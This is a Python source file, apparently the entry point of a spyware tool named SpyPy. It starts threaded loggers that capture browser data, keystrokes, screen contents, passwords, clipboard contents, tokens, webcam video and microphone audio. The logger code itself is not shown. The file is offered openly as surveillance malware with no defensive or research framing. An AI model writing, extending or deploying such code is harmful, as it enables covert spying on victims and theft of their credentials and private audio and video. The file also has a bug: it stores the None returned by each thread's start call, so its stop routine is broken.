from threading import Thread

from utils import *
from loggers.browser_logger import BrowserLogger
from loggers.input_logger import InputLogger
from loggers.screen_logger import ScreenLogger
from loggers.password_logger import PasswordLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.token_logger import TokenLogger
from loggers.webcam_logger import WebcamLogger
from loggers.microphone_logger import MicrophoneLogger

class SpyPy:
    def __init__(self):
        self.is_first_run = is_first_run()        
        self.loggers = [
            BrowserLogger(),
            InputLogger(),
            ScreenLogger(),
            PasswordLogger(),
            ClipboardLogger(),
            TokenLogger(),
            WebcamLogger(),
            MicrophoneLogger()
        ]
        self.threads :list[Thread] = []
        self.start()

    def start(self):
        for logger in self.loggers:
            thread = Thread(target=logger.start, name=type(logger).__name__).start()
            self.threads.append(thread)

    def stop(self):
        for logger in self.loggers:
            logger.stop()
        for thread in self.threads:
            thread.join()
        os._exit(0) # force exit because threads take a while to close properly


if __name__ == "__main__":
    spypy = SpyPy() # woohoo!!!!